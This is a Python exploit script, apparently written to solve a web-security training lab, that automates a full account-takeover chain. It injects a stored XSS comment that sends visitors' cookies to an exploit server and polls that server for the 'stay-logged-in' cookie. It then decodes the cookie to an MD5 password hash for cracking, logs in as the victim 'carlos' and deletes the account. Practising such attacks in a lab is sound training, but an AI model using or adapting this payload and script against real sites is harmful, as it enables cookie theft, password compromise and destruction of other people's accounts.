import requests
import base64
import sys
import urllib3
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore

# Burp Suite proxy
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',  
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
}

def XSS_injection(s, url, url_exploit):
    comment_url = url + '/post/comment'
    payload = {
        'postId': '2',
        'comment': f"<script>document.location=\'{url_exploit}\' + document.cookie</script>",
        'name': 'test',
        'email': 'test@gmail.com',
        'website': 'https://test.com',
    }
    r = s.post(comment_url, data=payload, headers=headers)

    injected_url = url + '/post?postId=2'
    r = s.get(injected_url, headers=headers, allow_redirects=True)
    if '<script>' in r.text:
        print('(+) Success injection web page')

def get_stay_logged_cookie(s, url_exploit):
    log_url = url_exploit + '/log'
    r = s.get(log_url)
    print('Wait for vitim click injection page .....')
    while 'stay-logged-in=' not in r.text:
        time.sleep(2)
        r = s.get(log_url)
    stay_cookie = r.text.split('stay-logged-in=')[1].split(' HTTP')[0]
    return stay_cookie

def decode_cookie(stay_cookie):
    hash_pass = base64.b64decode(stay_cookie).decode('utf-8')[7:]
    print(f'Md5 hash password: {hash_pass}')
    print('Go to https://crackstation.net/ to decode the md5 popular password')
    password = input('Type password decoded here: ')
    return password

def login_carlos_acc(s, url, password):
    login_url = url + '/login'
    payload = {
        'username': 'carlos',
        'password': password,
    }
    print('Log in Carlos account..')
    r = s.post(login_url, data=payload, headers=headers, allow_redirects=True)
    if 'Delete account' in r.text:
        print('(+) Successful log in Carlos account')
    else:
        print('(-) Fail to login Carlos account or deleted acc')

def delete_carlos_acc(s, url, password):
    delete_url = url + '/my-account/delete'
    payload = { 'password': password }
    r = s.post(delete_url, data=payload, headers=headers, allow_redirects=True)

    if 'Congratulations, you solved the lab!' in r.text:
        print('Deleted Carlos account')
        print("(+) Successful solved lab")
        sys.exit()
    print('(-) Fail to solve')
    sys.exit(-1)


def main():
    if len(sys.argv) != 3:
        print("(+) Usage: %s <url> <url_exploit>" % sys.argv[0])
        print("(+) Example: %s www.example.com www.exploit_server.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]
    url_exploit = sys.argv[2]
    XSS_injection(s, url, url_exploit)
    stay_cookie = get_stay_logged_cookie(s, url_exploit)
    password = decode_cookie(stay_cookie)
    login_carlos_acc(s, url, password)
    delete_carlos_acc(s, url, password)

if __name__ == '__main__':
    main()